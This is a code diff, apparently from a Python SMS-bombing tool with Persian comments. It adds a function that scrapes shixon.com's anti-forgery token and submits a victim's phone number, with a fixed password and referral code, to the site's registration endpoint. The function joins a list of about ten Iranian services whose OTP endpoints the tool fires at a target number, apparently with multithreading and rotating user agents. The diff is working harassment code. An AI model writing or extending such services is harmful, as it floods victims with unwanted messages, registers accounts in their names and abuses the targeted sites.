@@ -64,6 +64,75 @@ def send_service_safe(service, phone):
 # ==========================
 
 
+
+def Shixon(phone):
+    try:
+        session = requests.Session()
+        
+        # دریافت صفحه اصلی برای استخراج توکن
+        home_response = session.get(
+            "https://www.shixon.com/Home/RegisterUser",
+            headers={"User-Agent": random.choice(user_agents)},
+            timeout=10
+        )
+        
+        # استخراج __RequestVerificationToken
+        token_match = re.search(r'name="__RequestVerificationToken" value="([^"]+)"', home_response.text)
+        if not token_match:
+            print(f'{r}[-] Shixon: Could not extract token{a}')
+            return False
+        
+        token = token_match.group(1)
+        print(f'{g}[+] Found Token: {token}{a}')
+        
+        # آماده سازی داده‌ها
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        payload = {
+            "M": formatted_phone,  # شماره موبایل
+            "P": "222222",  # رمز عبور (مقدار ثابت)
+            "s": "888",     # کد معرف (مقدار ثابت)
+            "PU": "",       # پارامتر خالی
+            "__RequestVerificationToken": token
+        }
+        
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "text/html, */*; q=0.01",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://www.shixon.com",
+            "Referer": "https://www.shixon.com/Home/RegisterUser",
+        }
+        
+        response = session.post(
+            "https://www.shixon.com/Home/RegisterUser",
+            data=payload,
+            headers=headers,
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] Shixon Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Shixon Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            if "success" in response.text.lower() or "ارسال" in response.text:
+                print(f'{g}(Shixon) Code Sent{a}')
+                return True
+            else:
+                print(f'{r}[-] Shixon: Response indicates failure{a}')
+                return False
+        else:
+            print(f'{r}[-] Shixon HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] Shixon Exception: {e}{a}')
+        return False
+
+
+
 def Charsooq(phone):
     try:
         url = "https://app.charsooq.com/api/v1/send-otp"
@@ -845,7 +914,7 @@ def nillarayeshi(phone):
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [Balad, Besparto, Charsooq, DigikalaJet, Footini, Koohshid, nillarayeshi, Okala, ShahreSandal, SibApp]
+services = [Balad, Besparto, Charsooq, DigikalaJet, Footini, Koohshid, nillarayeshi, Okala, ShahreSandal, Shixon, SibApp]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
